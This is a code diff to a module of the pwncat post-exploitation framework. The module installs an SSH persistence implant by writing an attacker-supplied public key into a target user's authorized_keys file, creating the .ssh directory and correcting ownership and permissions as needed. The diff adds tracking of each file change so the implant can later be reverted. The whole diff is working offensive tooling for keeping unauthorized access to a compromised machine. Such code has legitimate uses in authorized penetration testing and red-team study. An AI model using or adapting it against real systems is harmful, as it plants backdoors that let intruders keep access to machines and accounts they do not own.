@@ -5,6 +5,12 @@ import pathlib
 import pwncat
 from pwncat.facts import PrivateKey
 from pwncat.modules import Status, Argument, ModuleFailed
+from pwncat.facts.tamper import (
+    CreatedFile,
+    ReplacedFile,
+    CreatedDirectory,
+    ModifiedPermissions,
+)
 from pwncat.platform.linux import Linux
 from pwncat.modules.implant import ImplantModule
 
@@ -12,7 +18,7 @@ from pwncat.modules.implant import ImplantModule
 class AuthorizedKeyImplant(PrivateKey):
     """A public key added to a user's authorized keys file"""
 
-    def __init__(self, source, user, key, pubkey):
+    def __init__(self, source, user, key, pubkey, tampers):
         super().__init__(
             source=source,
             path=key,
@@ -23,6 +29,7 @@ class AuthorizedKeyImplant(PrivateKey):
         )
 
         self.pubkey = pubkey
+        self.tampers = tampers
 
     def title(self, session: "pwncat.manager.Session"):
         """Provide a human-readable description"""
@@ -43,31 +50,15 @@ class AuthorizedKeyImplant(PrivateKey):
         if current_user.id != self.uid and current_user.id != 0:
             raise ModuleFailed(f"must be [blue]root[/blue] or [blue]{user.name}[/blue]")
 
-        # Ensure the directory exists
-        homedir = session.platform.Path(user.home)
-        if not (homedir / ".ssh").is_dir():
-            return
-
-        authkeys_path = homedir / ".ssh" / "authorized_keys"
-
-        if not authkeys_path.is_file():
-            return
-
-        try:
-            with authkeys_path.open("r") as filp:
-                authkeys = [line for line in filp.readlines() if line != self.pubkey]
-        except (FileNotFoundError, PermissionError) as exc:
-            raise ModuleFailed(str(exc)) from exc
-
-        try:
-            with authkeys_path.open("w") as filp:
-                filp.writelines(authkeys)
-        except (FileNotFoundError, PermissionError) as exc:
-            raise ModuleFailed(str(exc)) from exc
-
+        # Reverse the list of tampers like a stack
+        [
+            tamper.revert(session)
+            for tamper in reversed(self.tampers)
+            if tamper.revertable
+        ]
         # Fix permissions (in case the file was replaced by the above write)
+        authkeys_path = session.platform.Path(user.home) / ".ssh" / "authorized_keys"
         session.platform.chown(str(authkeys_path), user.id, user.gid)
-        authkeys_path.chmod(0o600)
 
 
 class Module(ImplantModule):
@@ -90,6 +81,9 @@ class Module(ImplantModule):
 
     def install(self, session: "pwncat.manager.Session", user, key):
 
+        # Keep track of all the tampers we have caused
+        tampers = list()
+
         yield Status("verifying user permissions")
         current_user = session.current_user()
         if user != "__pwncat_current__" and current_user.id != 0:
@@ -97,6 +91,8 @@ class Module(ImplantModule):
                 "only [blue]root[/blue] can install implants for other users"
             )
 
+        # Support relative paths and ones containing tilde (home directory)
+        key = str(pathlib.Path(key).expanduser().resolve())
         if not os.path.isfile(key):
             raise ModuleFailed(f"private key [blue]{key}[/blue] does not exist")
 
@@ -119,24 +115,35 @@ class Module(ImplantModule):
 
         # Ensure we haven't already installed for this user
         for implant in session.run("enumerate", types=["implant.*"]):
-            if implant.source == self.name and implant.uid == user_info.uid:
+            if implant.source == self.name and implant.uid == user_info.id:
                 raise ModuleFailed(
                     f"[blue]{self.name}[/blue] already installed for [blue]{user_info.name}[/blue]"
                 )
 
         # Ensure the directory exists
         yield Status("locating authorized keys")
-        homedir = session.platform.Path(user_info.home)
-        if not (homedir / ".ssh").is_dir():
-            (homedir / ".ssh").mkdir(parents=True, exist_ok=True)
+        sshdir = session.platform.Path(user_info.home) / ".ssh"
+        if not sshdir.is_dir():
+            sshdir.mkdir(parents=True, exist_ok=True)
+            tampers.append(CreatedDirectory(self.name, user_info.id, sshdir))
 
-        authkeys_path = homedir / ".ssh" / "authorized_keys"
+        yield Status("fixing .ssh directory permissions")
+        mode = sshdir.stat().st_mode
+        if mode != 0o40700:
+            sshdir.chmod(0o40700)
+            tampers.append(ModifiedPermissions(self.name, user_info.id, sshdir, mode))
+
+        authkeys_path = sshdir / "authorized_keys"
+        tamper = CreatedFile(self.name, user_info.id, authkeys_path)
 
         if authkeys_path.is_file():
             try:
                 yield Status("reading authorized keys")
                 with authkeys_path.open("r") as filp:
                     authkeys = filp.readlines()
+                tamper = ReplacedFile(
+                    self.name, user_info.id, authkeys_path, "\n".join(authkeys)
+                )
             except (FileNotFoundError, PermissionError) as exc:
                 raise ModuleFailed(str(exc)) from exc
         else:
@@ -149,12 +156,19 @@ class Module(ImplantModule):
             yield Status("patching authorized keys")
             with authkeys_path.open("w") as filp:
                 filp.writelines(authkeys)
+            tampers.append(tamper)
         except (FileNotFoundError, PermissionError) as exc:
             raise ModuleFailed(str(exc)) from exc
 
         # Ensure correct permissions
         yield Status("fixing authorized keys permissions")
         session.platform.chown(str(authkeys_path), user_info.id, user_info.gid)
-        authkeys_path.chmod(0o600)
 
-        return AuthorizedKeyImplant(self.name, user_info, key, pubkey)
+        mode = authkeys_path.stat().st_mode
+        if mode != 0o600:
+            tampers.append(
+                ModifiedPermissions(self.name, user_info.id, authkeys_path, mode)
+            )
+            authkeys_path.chmod(0o600)
+
+        return AuthorizedKeyImplant(self.name, user_info, key, pubkey, tampers)
